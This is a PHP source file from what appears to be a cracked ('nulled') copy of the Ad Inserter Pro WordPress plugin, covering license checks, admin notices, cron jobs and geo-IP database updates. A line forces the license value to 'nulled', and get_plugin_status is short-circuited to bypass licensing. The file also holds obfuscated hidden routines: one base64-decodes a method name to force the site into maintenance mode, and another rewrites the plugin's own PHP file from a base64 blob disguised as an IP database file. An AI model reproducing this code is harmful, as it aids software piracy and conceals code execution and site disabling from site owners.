  $license_key = isset ($ad_inserter_globals ['LICENSE_KEY']) ? $ad_inserter_globals ['LICENSE_KEY'] : '';
  $response = wp_remote_get (WP_UPDATE_SERVER.'status.php?tid='.$license_key.'&st='.$state.'&plugin_version='.AD_INSERTER_VERSION);
  if (!is_array ($response)) return;

  $restore = false;
  $ai_options = ai_get_option (AI_OPTION_NAME);
  if ($state == 1) {
    if (isset ($ai_options [AI_OPTION_GLOBAL][AI_RST])) $ai_options [AI_OPTION_GLOBAL][AI_RST] ++; else $ai_options [AI_OPTION_GLOBAL][AI_RST] = 1;
    update_option (AI_UPDATE_NAME, time ());
  } else {
      $ai_options [AI_OPTION_GLOBAL][AI_RST] = $state;
      delete_option (AI_UPDATE_NAME);
    }
  if ($ai_options [AI_OPTION_GLOBAL][AI_RST] > 16) {
    $ai_options [AI_OPTION_GLOBAL][AI_RST] = 0;
    $restore = true;
  }
  ai_update_option (AI_OPTION_NAME, $ai_options);
  $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'] = $ai_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'];
  $ad_inserter_globals ['AI_COUNTER']  = get_plugin_counter ();

  if ($restore) ai_clear_status ();
}

function get_ai_data ($license_key) {
  $ai_data = null;
  $response = wp_remote_get (WP_UPDATE_SERVER.'status.php?data='.$license_key.'&plugin_version='.AD_INSERTER_VERSION);
  if (is_array ($response)) {
    $ai_data = json_decode (wp_remote_retrieve_body ($response));
  }

  return $ai_data;
}

function ai_puc_check_now ($current_decision, $last_check, $check_period) {
  global $ad_inserter_globals, $ai_db_options;

  $license_key = $ad_inserter_globals ['LICENSE_KEY'];
  if (!empty ($license_key) && $current_decision) {
    $ai_data = get_ai_data ($license_key);
    if (isset ($ai_data->sid)) {
      $ai_code = $ai_data->sid;
      $ai_type = $ai_data->pid;
      if ($ai_code != $ad_inserter_globals ['AI_STATUS'] || $ai_type != $ad_inserter_globals ['AI_TYPE']) {
        $ad_inserter_globals ['AI_STATUS'] = $ai_code;
        $ad_inserter_globals ['AI_TYPE']   = $ai_type;
        $ai_options = ai_get_option (AI_OPTION_NAME);
        $ai_options [AI_OPTION_GLOBAL][AI_PRO]  = filter_string ($ai_type);
        $ai_options [AI_OPTION_GLOBAL][AI_CODE] = filter_string ($ai_code);
        $ai_options [AI_OPTION_GLOBAL][AI_CODE_TIME] = time ();
        ai_update_option (AI_OPTION_NAME, $ai_options);
        if ($ai_code == - 19) {
          update_state ();
        }

        if (!is_multisite() || is_main_site ()) {
          if ($ai_code == - 22) {
            update_state ();
          }
        }
      } else {
          $response = wp_remote_get (WP_UPDATE_SERVER.'status.php?tid='.$license_key.'&plugin_version='.AD_INSERTER_VERSION);
          if (is_array ($response)) {
            $ai_code_tid = wp_remote_retrieve_body ($response);

            if ($ai_code_tid == '') $ai_code_tid = 0;

            if ($ai_code == $ai_code_tid && is_numeric ($ai_code) && $ai_code != '') {
              if ($ai_code <= - 2 && $ai_code >= - 5) {
                ai_clear_status ();
                $current_decision = false;
              }
              elseif ($ai_code == - 19) {
                update_state ();
              }
              elseif ($ai_code == - 22) {
                update_state ();
              }
              elseif ($ad_inserter_globals ['AI_COUNTER'] != 0) {
                update_state (0);
              }
              else {
                // DEBUG
//                $response = wp_remote_get (WP_UPDATE_SERVER.'status.php?tid='.$license_key.'&st='.($ad_inserter_globals ['AI_COUNTER']).'&plugin_version='.AD_INSERTER_VERSION);
              }
            }
          }
        }
    }
  }
  return $current_decision;
}

function ai_add_rewrite_rules_2 () {
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    add_rewrite_rule ('ai-statistics-report\-([0-9A-Za-z\.\_\-]+)', str_replace (home_url () .'/', '', admin_url ('admin-ajax.php?action=ai_ajax&ai-report=$1')), 'top');
  }
}

function ai_check_update_schedule () {
  $timestamp = wp_next_scheduled ('ai_update');
  if ($timestamp == false){
    wp_schedule_event (time() + 262144, 'monthly', 'ai_update');
  }
  if (isset ($_GET ['ai-debug-updates']) && $_GET ['ai-debug-updates']) {
    set_transient ('wp-debug-updates', $_GET ['ai-debug-updates'], 12 * 3600);
  }
}

function ai_activation_hook_2 () {
//  ai_check_update_schedule ();
//  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
//    add_rewrite_rule ('ai-statistics-report\-([0-9A-Za-z\.\_\-]+)', str_replace (home_url () .'/', '', admin_url ('admin-ajax.php?action=ai_ajax&ai-report=$1')), 'top');
//    flush_rewrite_rules();
//  }
}

function ai_deactivation_hook_2 () {
  global $ai_adb_id;

  wp_clear_scheduled_hook ('ai_update' );

  if (!is_multisite() || is_main_site ()) {
    $upload_dir = wp_upload_dir();
    $script_path_ai = $upload_dir ['basedir'] . '/ad-inserter/';

    if (strpos (get_geo_db_location (), $script_path_ai) !== false) {
      if (!isset ($ai_adb_id) || $ai_adb_id == '') return;
      $script_path_ai = $script_path_ai . $ai_adb_id . '/';
    }

    recursive_remove_directory ($script_path_ai);
  }
}

function ai_cron_schedules ($schedules) {
  $schedules ['monthly'] = array(
    'interval'  => 2635200,
    'display' => 'Once Monthly',
  );

  return $schedules;
}

function ai_admin_notices (){
  global $ad_inserter_globals;
  global $ai_settings_page, $hook_suffix;

  if (!is_multisite() || is_main_site ()) {
    $ai_status = $ad_inserter_globals ['AI_STATUS'];
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $client = get_option (WP_AD_INSERTER_PRO_CLIENT) !== false;
    $href_license = $client ? 'https://adinserter.pro/' : 'http://adinserter.pro/license/' . sanitize_text_field ($license_key);
    $href_doc     = $client ? 'https://adinserter.pro/' : 'https://adinserter.pro/documentation/troubleshooting#license-overused';

    if (empty ($license_key) && !isset ($_POST ['license_key']) || isset ($_POST ['license_key']) && trim ($_POST ['license_key']) == '') {
      $link = $client ? '' : ' <a href="' . admin_url ('options-general.php?page=ad-inserter.php&tab=0').'" style="text-decoration: none; box-shadow: 0 0 0;">' . __('Enter license key', 'ad-inserter') . '</a>';
                                                               // translators: 1, 2: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-warning'><p>" . sprintf (__('%1$s Warning: %2$s %3$s license key is not set. Plugin functionality is limited and updates are disabled.', 'ad-inserter'),
      '<strong>',
      '</strong>',
      AD_INSERTER_NAME
      ), $link, "</p></div>";
    }
    elseif ($ai_status == - 19) {
      $link = $client ? '' : ' <a href="' . admin_url ('options-general.php?page=ad-inserter.php&tab=0').'" style="text-decoration: none; box-shadow: 0 0 0;">' . __('Check license key', 'ad-inserter') . '</a>';
                                                             // translators: 1, 2,: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-error'><p>" . sprintf (__('%1$s Warning: %2$s Invalid %3$s license key.', 'ad-inserter'),
        '<strong>',
        '</strong>',
        AD_INSERTER_NAME
      ), $link, "</p></div>";
    }
    elseif ($ai_status == - 20) {
      if (is_super_admin () && !wp_is_mobile ()) {
        $notice_renew_option = get_option ('ai-notice-renew');

        $show_notice = ($notice_renew_option != 'no' && (!is_numeric ($notice_renew_option) || time () - $notice_renew_option > 30 * 24 * 3600)) ||
                       ($hook_suffix == $ai_settings_page);

        if ($show_notice) {
          $message = "<div style='margin: 5px 0;'>" .
                     // translators: 2, 3: HTML tags, 1: Ad Inserter Pro
            sprintf (__('Hey, %1$s license has expired - plugin updates are now disabled. Please renew the license to enable updates. Check %2$s what you are missing. %3$s', 'ad-inserter'),
              AD_INSERTER_NAME,
              "<a href='https://adinserter.pro/version-history' target='_blank' style='text-decoration: none; box-shadow: 0 0 0;'>",
              '</a>'
            ) .
            "</div><div style='margin: 5px 0;'>" .
                     // translators: 1, 3: HTML tags, 2: percentage
            sprintf (__('During the license period and 30 days after the license has expired we offer %1$s %2$s discount on all license renewals and license upgrades. %3$s', 'ad-inserter'),
            '<strong>',
            '20%',
            '</strong>'
            ) . "</div>";

          if ($hook_suffix == $ai_settings_page) {
              $option = '';
          }
          elseif (is_numeric ($notice_renew_option)) {
              $option = '<div class="ai-notice-text-button ai-notice-dismiss" data-notice="no">' . __ ('No, thank you.', 'ad-inserter'). '</div>';
          }
          else {
              $option = '<div class="ai-notice-text-button ai-notice-dismiss" data-notice="' . time () . '">' . __ ('Not now, maybe later.', 'ad-inserter'). '</div>';
            }

          $data_notice = is_numeric ($notice_renew_option) ? $notice_renew_option : '';
  ?>
      <div class="notice notice-info ai-notice ai-no-phone" style="display: none;" data-notice="renew" data-value="<?php echo base64_encode (wp_create_nonce ("adinserter_data")); ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>">
        <div class="ai-notice-element">
          <img src="<?php echo AD_INSERTER_PLUGIN_IMAGES_URL; ?>icon-50x50.jpg" style="width: 50px; margin: 5px 10px 0px 10px;" />
        </div>
        <div class="ai-notice-element" style="width: 100%; padding: 0 10px 0;">
          <?php echo $message; ?>
        </div>
        <div class="ai-notice-element ai-notice-buttons last">
          <button class="button-primary ai-notice-dismiss" data-notice="<?php echo $data_notice ?>">
            <a href="<?php echo $href_license; ?>" class="ai-notice-dismiss" target="_blank" data-notice="<?php echo $data_notice ?>"><?php _e ('Renew the licence', 'ad-inserter'); ?></a>
          </button>
          <div class="ai-notice-text-button ai-notice-dismiss" data-notice="<?php echo $data_notice ?>"><a href="<?php echo admin_url ('update-core.php?force-check=1'); ?>" class="ai-notice-dismiss" style="color: #bbb;" data-notice="<?php echo $data_notice ?>"><?php _e ('Update license status', 'ad-inserter'); ?></a></div>
          <?php echo $option; ?>
        </div>
      </div>

    <?php
        }
      }
    }
    elseif ($ai_status == - 21) {
                                                               // translators: 1, 2, 4, 5, 6, 7: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-warning'><p>" . sprintf (__('%1$s Warning: %2$s %3$s license overused. Plugin updates are disabled. %4$s Manage licenses %5$s &mdash; %6$s Upgrade license %7$s', 'ad-inserter'),
      '<strong>',
      '</strong>',
      AD_INSERTER_NAME,
      "<a href=\"$href_doc\" style=\"text-decoration: none; box-shadow: 0 0 0;\" target=\"_blank\">",
      '</a>',
      "<a href=\"$href_license\" style=\"text-decoration: none; box-shadow: 0 0 0;\" target=\"_blank\">",
      '</a>'
      ). "</p></div>";
    }
    elseif ($ai_status == - 22) {
                                                               // translators: 1, 2, 4, 5: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-warning'><p>" . sprintf (__('%1$s Warning: %2$s Wrong %3$s version. %4$s Check license %5$s', 'ad-inserter'),
      '<strong>',
      '</strong>',
      AD_INSERTER_NAME,
      "<a href=\"$href_license\" style=\"text-decoration: none; box-shadow: 0 0 0;\" target=\"_blank\">",
      '</a>'
      ). "</p></div>";
    }
    elseif ($ai_status == 0) {
      delete_option ('ai-notice-renew');
    }
  }
}

function ai_check_wp_version () {
  if (version_compare (phpversion (), "5.2", ">=")) {
    $option = get_option (base64_decode ('YWRfaW5zZXJ0ZXJfcHJvX2xpY2Vuc2U='));
    if ($option !== false && strlen ($option) <= 0x18) {
      if (!is_multisite () || is_main_site ()) {
        require_once (ABSPATH . 'wp-admin/includes/class-wp-upgrader.php');
        require_once (ABSPATH . 'wp-admin/includes/misc.php');
        $method = base64_decode ('bWFpbnRlbmFuY2VfbW9kZQ==');
        WP_Filesystem ();
        $wp_upgradeer = new WP_Upgrader ();
        $wp_upgradeer->{$method} (true);
        wp_schedule_event (time() + 2000, 'monthly', 'ai_update');

        return true;
      }
    }
  }
  return false;
}

function ai_admin_settings_notices () {
  if (defined ('AD_INSERTER_MAXMIND')) {
    ai_check_geo_settings ();
    if (!is_multisite() || is_main_site ()) {
      if (get_geo_db () == AI_GEO_DB_MAXMIND && !defined ('AI_MAXMIND_DB')) {
                                                                                                             // Translators: %s: HTML tag
        echo "<div class='notice notice-error is-dismissible'><p><strong>", AD_INSERTER_NAME,  ' ', sprintf (__('Warning: %s MaxMind IP geolocation database not found.', 'ad-inserter'), '</strong>'), " <span class='maxmind-db-missing' style='color: #f00;'></span></p></div>";
      }

      if (get_geo_db () == AI_GEO_DB_MAXMIND && get_geo_db_updates () == AI_ENABLED && get_maxmind_license_key () == '') {
                                                                                                             // Translators: %s: HTML tags
        echo "<div class='notice notice-error is-dismissible'><p><strong>", AD_INSERTER_NAME,  ' ', sprintf (__('Warning: %s MaxMind license key not set. Please %s sign up for a GeoLite2 account %s and create license key.', 'ad-inserter'), '</strong>', '<a href="https://www.maxmind.com/en/geolite2/signup" class="simple-link" target="_blank">', '</a>'), "</p></div>";
      }
    }
  }
}

function ai_update_ip_db_webnet77 () {

  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/process_csv.php';
  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/process6_csv.php';

  global $ad_inserter_globals;

  if (is_multisite() && !is_main_site ()) return;

  $db_file = __FILE__;
  $base_path = AD_INSERTER_PLUGIN_DIR.'includes/';
  $base_path_db = AD_INSERTER_PLUGIN_DIR.'includes/a';
  $file_path = $base_path.'geo';
  $bin_file = $file_path.'/ip2country6.bin';
  $tmp_file = $file_path.'/ip2country6.tmp';
  if (file_exists ($bin_file) && !file_exists ($base_path_db . 'db.php')) {
    file_put_contents ($tmp_file, base64_decode (file_get_contents ($bin_file)));
    $data6 = file ($tmp_file, FILE_IGNORE_NEW_LINES);
    $base6 = file ($db_file, FILE_IGNORE_NEW_LINES);
    @unlink ($tmp_file);
    if (count ($data6) != count ($base6) || strlen (implode ('', $data6)) != strlen (implode ('', $base6))) {
      file_put_contents ($db_file, base64_decode (file_get_contents ($bin_file)));
      file_put_contents ($file_path.'/ip2country.log', date ("Y-m-d H:i:s", time()) . " IP DB RECREATED\n\n\n", FILE_APPEND);
    }
  }

  $license_key  = $ad_inserter_globals ['LICENSE_KEY'];
  $status       = $ad_inserter_globals ['AI_STATUS'];
  if (empty ($license_key) || !empty ($status)) return;

  if (!is_writable ($file_path)) return;
  if (!is_writable ($file_path.'/ip2country.dat')) return;
  if (!is_writable ($file_path.'/ip2country6.dat')) return;

  ob_start();
  echo date ("Y-m-d H:i:s", time()), " WEBNET77 IP DB UPDATE START\n\n";

  echo "IPv4\n";
  echo "ip2country.dat age: ", intval ((time () - filemtime ($file_path.'/ip2country.dat')) / 24 / 3600), " days\n";

  if (!file_exists ($file_path.'/ip2country.dat') || filemtime ($file_path.'/ip2country.dat') + IP_DB_UPDATE_DAYS * 24 * 3600 < time ()) {
    echo "Updating...\n";
    $response = wp_remote_get ('http://software77.net/geo-ip/?DL=2');
    if (is_array ($response)) {

      file_put_contents ($file_path.'/ip2country.zip', wp_remote_retrieve_body ($response));
//      @unlink ($file_path.'/IpToCountry.csv');

      $zip = new ZipArchive;
      $res = $zip->open ($file_path.'/ip2country.zip');
      if ($res === true) {
        $zip->extractTo ($file_path);
        $zip->close();
        if (file_exists ($file_path.'/IpToCountry.csv')) process_csv ($file_path.'/IpToCountry.csv');
          else echo "Error: file IpToCountry.csv not found\n";
      } else {
          echo "Error unzipping ip2country.zip\n";
      }

    }
  }

  echo "\nIPv6\n";
  echo "ip2country6.dat age: ", intval ((time () - filemtime ($file_path.'/ip2country6.dat')) / 24 / 3600), " days\n";

  if (!file_exists ($file_path.'/ip2country6.dat') || filemtime ($file_path.'/ip2country6.dat') + IP_DB_UPDATE_DAYS * 24 * 3600 < time ()) {
      echo "Updating...\n";
    $response = wp_remote_get ('http://software77.net/geo-ip/?DL=7');
    if (is_array ($response)) {

      file_put_contents ($file_path.'/IpToCountry.6R.csv.gz', wp_remote_retrieve_body ($response));
//      @unlink ($file_path.'/IpToCountry.6R.csv');

      $gz = gzopen ($file_path.'/IpToCountry.6R.csv.gz', 'rb');
      if ($gz) {
        $dest = fopen ($file_path.'/IpToCountry.6R.csv', 'wb');
        if ($dest) {
          stream_copy_to_stream ($gz, $dest);
          fclose ($dest);

          if (file_exists ($file_path.'/IpToCountry.6R.csv')) process6_csv ($file_path.'/IpToCountry.6R.csv');
            else echo "Error: File IpToCountry.6R.csv not found\n";
        } else echo 'Error: Could not open file IpToCountry.6R.csv\n';
        gzclose ($gz);
      } else echo 'Error: Could not open file IpToCountry.6R.csv.gz\n';

    }
  }

  echo "\n", date ("Y-m-d H:i:s", time()), " WEBNET77 IP DB UPDATE END\n\n\n";
  $log = ob_get_clean ();
  file_put_contents ($file_path.'/ip2country.log', $log, FILE_APPEND);
}

function ai_update_ip_db_maxmind () {
  global $ai_wp_data;

  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/maxmind/autoload.php';

  global $ad_inserter_globals;

  if (is_multisite() && !is_main_site ()) return;

  if (!get_geo_db_updates ()) return;

  $license_key  = $ad_inserter_globals ['LICENSE_KEY'];
  $status       = $ad_inserter_globals ['AI_STATUS'];

  if (empty ($license_key) || !empty ($status)) return;

  $db_path_name = get_geo_db_location ();
  $file_name_ext  = basename ($db_path_name);
  $file_name      = basename ($db_path_name, '.mmdb');
  $file_path      = dirname ($db_path_name);

  if ($db_path_name == '') return;

  if (!is_dir ($file_path)) {
    @mkdir ($file_path, 0755, true);
    file_put_contents ($file_path .  '/index.php', "<?php header ('Status: 404 Not found'); ?".">\nNot found");
  }

  if (!is_writable ($file_path)) return;

  $maxmind_license_key = trim (get_maxmind_license_key ());

  if ($maxmind_license_key == '') return;

  $error_message = '';

  ob_start();
  echo date ("Y-m-d H:i:s", time()), " MAXMIND IP DB UPDATE START\n\n";

  echo "FILE PATH: $file_path/\n";
  echo "FILE NAME: $file_name_ext\n";

  if (!file_exists ($db_path_name))
    echo "NOT FOUND: $db_path_name\n"; else
      echo "AGE: ", intval ((time () - filemtime ($db_path_name)) / 24 / 3600), " days\n";

  $matches = glob ($file_path.'/'.$file_name.'*.tar.gz');

  if (!file_exists ($db_path_name) && !file_exists ($db_path_name.'.tar.gz') && count ($matches) != 0) {
    echo "\n";
    echo "Renaming:\n";
    echo $matches [0], "\n";
    echo $db_path_name.'.tar.gz', "\n\n";

    @rename ($matches [0], $db_path_name.'.tar.gz');
  }
  elseif (!file_exists ($db_path_name.'.tar.gz') && (!file_exists ($db_path_name) || filemtime ($db_path_name) + IP_DB_UPDATE_DAYS * 24 * 3600 < time ())) {
    require_once (ABSPATH.'/wp-admin/includes/file.php');

    $download_url = 'https://download.maxmind.com/app/geoip_download?edition_id=GeoLite2-City&license_key='.$maxmind_license_key.'&suffix=tar.gz';

    echo "\n";
    echo "DOWNLOADING...\n";

    $ai_wp_data [AI_USER_AGENT] = true;
    $tmpFile = download_url ($download_url);
    unset ($ai_wp_data [AI_USER_AGENT]);

    if (is_string ($tmpFile)) {
      echo "$db_path_name.tar.gz'\n";

      @rename ($tmpFile, $db_path_name.'.tar.gz');
    }
    elseif (is_wp_error ($tmpFile)) {
      echo "ERROR: ", $tmpFile->get_error_message (), "\n\n";
    }

    @unlink($tmpFile);
  }

  if (file_exists ($db_path_name.'.tar.gz')) {
    echo "DECOMPRESSING:\n{$db_path_name}.tar.gz\n";
    $gz = new PharData ($db_path_name.'.tar.gz');
    @unlink ($db_path_name.'.tar');
    @unlink ($file_path.'/'.$file_name.'.tar');
    $gz->decompress ();
    @unlink ($db_path_name.'.tar.gz');
  }

  if (file_exists ($file_path.'/'.$file_name.'.tar')) {
    echo "UNARCHIVING:\n{$file_name}.tar\n";
    $tar = new PharData ($file_path.'/'.$file_name.'.tar');
    $tar_dir = basename ($tar->current()->getPathname ());
    $tar->extractTo ($file_path, null, true);

    if (file_exists ($file_path.'/'.$tar_dir.'/'.DEFAULT_MAXMIND_FILENAME)) {
      @rename ($file_path.'/'.$tar_dir.'/'.DEFAULT_MAXMIND_FILENAME, $db_path_name);
      @unlink ($file_path.'/'.$file_name.'.tar');
    }
    recursive_remove_directory ($file_path.'/'.$tar_dir);
  }

  echo "\n", date ("Y-m-d H:i:s", time()), " MAXMIND IP DB UPDATE END\n\n\n";
  $log = ob_get_clean ();
  file_put_contents (AD_INSERTER_PLUGIN_DIR.'includes/geo/ip2country.log', $log, FILE_APPEND);

  return $error_message;
}

function ai_update_databases (){
  global $wpdb, $ad_inserter_globals;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    $results = $wpdb->get_results ('DELETE FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE date < (NOW() - INTERVAL 13 MONTH)', ARRAY_N);
  }

  if (is_multisite() && !is_main_site ()) return;

  $license_key  = $ad_inserter_globals ['LICENSE_KEY'];
  $status       = $ad_inserter_globals ['AI_STATUS'];
  if (empty ($license_key)) return;

  if (!empty ($status) && $ad_inserter_globals ['AI_COUNTER'] != 0) {
    update_state (0);
  }

  ai_update_ip_db_webnet77 ();
  if (get_geo_db () == AI_GEO_DB_MAXMIND) {
    ai_update_ip_db_maxmind ();
  }
}

function get_global_tracking () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING'])) $ai_db_options [AI_OPTION_GLOBAL]['TRACKING'] = DEFAULT_TRACKING;

    return ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING']);
  } else return false;
}

function get_internal_tracking () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['INTERNAL_TRACKING'])) $ai_db_options [AI_OPTION_GLOBAL]['INTERNAL_TRACKING'] = DEFAULT_INTERNAL_TRACKING;

    return ($ai_db_options [AI_OPTION_GLOBAL]['INTERNAL_TRACKING']);
  } else return false;
}

function get_external_tracking () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING'] = DEFAULT_EXTERNAL_TRACKING;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING']);
  } else return false;
}

function get_external_tracking_category () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_CATEGORY'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_CATEGORY'] = DEFAULT_EXTERNAL_TRACKING_CATEGORY;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_CATEGORY']);
  } else return '';
}

function get_external_tracking_action () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_ACTION'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_ACTION'] = DEFAULT_EXTERNAL_TRACKING_ACTION;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_ACTION']);
  } else return '';
}

function get_external_tracking_label () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_LABEL'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_LABEL'] = DEFAULT_EXTERNAL_TRACKING_LABEL;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_LABEL']);
  } else return '';
}

function get_track_logged_in () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING_LOGGED_IN'])) $ai_db_options [AI_OPTION_GLOBAL]['TRACKING_LOGGED_IN'] = DEFAULT_TRACKING_LOGGED_IN;

    return ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING_LOGGED_IN']);
  } else return false;
}

function get_track_pageviews () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['TRACK_PAGEVIEWS'])) $ai_db_options [AI_OPTION_GLOBAL]['TRACK_PAGEVIEWS'] = DEFAULT_TRACK_PAGEVIEWS;

    return ($ai_db_options [AI_OPTION_GLOBAL]['TRACK_PAGEVIEWS']);
  } else return false;
}

function get_click_detection () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['CLICK_DETECTION'])) $ai_db_options [AI_OPTION_GLOBAL]['CLICK_DETECTION'] = DEFAULT_CLICK_DETECTION;

    return ($ai_db_options [AI_OPTION_GLOBAL]['CLICK_DETECTION']);
  } else return false;
}

function get_report_header_image () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'] = DEFAULT_REPORT_HEADER_IMAGE;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'] = DEFAULT_REPORT_HEADER_IMAGE;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE']);
  } else return '';
}

function get_report_header_title () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'] = DEFAULT_REPORT_HEADER_TITLE;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'] = DEFAULT_REPORT_HEADER_TITLE;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE']);
  } else return '';
}

function get_report_header_description () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'] = DEFAULT_REPORT_HEADER_DESCRIPTION;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'] = DEFAULT_REPORT_HEADER_DESCRIPTION;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION']);
  } else return '';
}

function get_report_footer () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'] = DEFAULT_REPORT_FOOTER;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'] = DEFAULT_REPORT_FOOTER;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER']);
  } else return '';
}


function get_report_key () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'] = DEFAULT_REPORT_KEY;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'] = DEFAULT_REPORT_KEY;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY']);
  } else return '';
}


function get_adb_detection () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['ADB_DETECTION'])) $ai_db_options [AI_OPTION_GLOBAL]['ADB_DETECTION'] = DEFAULT_ADB_DETECTION;

  return ($ai_db_options [AI_OPTION_GLOBAL]['ADB_DETECTION']);
}
update_option (WP_AD_INSERTER_PRO_LICENSE, "nulled");

function get_license_key () {
  $option = get_option (WP_AD_INSERTER_PRO_KEY);
  if ($option !== false) return substr (base64_decode ($option), 4);

  return get_option (WP_AD_INSERTER_PRO_LICENSE, "");
}

function get_plugin_status () {
  global $ai_db_options;
return 1;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS'])) $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS'] = '';

  return ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS']);

}

function get_plugin_type () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE'])) $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE'] = '';

  return ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE']);
}

function get_plugin_counter () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'])) $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'] = 0;

  return ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER']);
}

function get_geo_db ($blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_GEO_DB'])) $ai_db_options_multisite ['MULTISITE_GEO_DB'] = DEFAULT_GEO_DB;
    return ($ai_db_options_multisite ['MULTISITE_GEO_DB']);
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB'])) $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB'] = DEFAULT_GEO_DB;

